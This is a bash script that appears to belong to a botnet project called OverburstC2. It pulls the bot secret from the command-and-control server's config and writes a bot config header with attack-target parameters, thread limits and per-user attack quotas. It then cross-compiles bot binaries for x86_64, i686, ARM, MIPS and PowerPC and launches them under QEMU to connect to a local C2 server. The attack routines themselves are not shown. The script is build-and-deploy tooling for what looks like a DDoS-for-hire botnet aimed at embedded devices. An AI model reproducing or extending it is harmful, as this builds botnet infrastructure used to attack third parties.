#!/bin/bash

# Get the server secret
SERVER_SECRET=$(cat ~/OverburstC2/src/config/config.json | grep -o '"bot_secret": "[^"]*"' | cut -d'"' -f4)

# Function to build and run a bot with specific ARCH_NAME
run_bot() {
    local arch_name="$1"
    local output="$2"
    local compiler="$3"
    local flags="$4"
    local qemu_cmd="$5"
    local qemu_lib="$6"
    
    echo "[*] Starting $arch_name bot..."
    
    # Create temp config with unique ARCH_NAME
    cat > bot/config_temp.h << EOH
#ifndef CONFIG_H
#define CONFIG_H

#include <time.h>

#define C2_ADDRESS "127.0.0.1"
#define C2_PORT 1337
#define ARCH_NAME "$arch_name"

typedef struct {
    char *ip;
    int port;
    time_t end_time;
    int *stop_flag;
} attack_params_t;

#define MAX_USERS 100
#define MAX_ATTACKS_PER_USER 10
#define MAX_THREADS 200
#define BUFFER_SIZE 4096
#define BOT_SECRET_B64 "$SERVER_SECRET"

typedef struct {
    int active;
    int stop;
    int thread_count;
} attack_info_t;

typedef struct {
    char username[64];
    int attack_count;
    time_t last_attack_time;
    attack_info_t attacks[MAX_ATTACKS_PER_USER];
} user_attack_t;

#endif
EOH
    
    # Use temp config
    cp bot/config_temp.h bot/config.h
    
    # Build the binary
    $compiler $flags -o "$output" bot/*.c -Wall -O2 2>/dev/null
    
    # Run it
    if [ -n "$qemu_cmd" ] && [ -n "$qemu_lib" ]; then
        $qemu_cmd -L "$qemu_lib" "$output" &
    elif [ -n "$qemu_cmd" ]; then
        $qemu_cmd "$output" &
    else
        "$output" &
    fi
    
    sleep 2
}

# Run x86_64 (native)
run_bot "x86_64" "binaries/bot_x86_64_unique" "gcc" "" "" ""

# Run i686 (native)
run_bot "i686" "binaries/bot_i686_unique" "i686-linux-gnu-gcc" "" "" ""

# Run ARM with QEMU
if command -v qemu-arm-static &> /dev/null; then
    run_bot "armv7l" "binaries/bot_armv7l_unique" "arm-linux-gnueabihf-gcc" "" "qemu-arm-static" "/usr/arm-linux-gnueabihf"
fi

# Run MIPS with QEMU
if command -v qemu-mips-static &> /dev/null; then
    run_bot "mips" "binaries/bot_mips_unique" "mips-linux-gnu-gcc" "" "qemu-mips-static" "/usr/mips-linux-gnu"
fi

# Run PowerPC with QEMU
if command -v qemu-ppc-static &> /dev/null; then
    run_bot "powerpc" "binaries/bot_powerpc_unique" "powerpc-linux-gnu-gcc" "" "qemu-ppc-static" "/usr/powerpc-linux-gnu"
fi

echo "============================================"
echo "All bots started! Check the C2 server:"
echo "Type 'BOTS' in the server terminal to see them."
echo "============================================"

wait
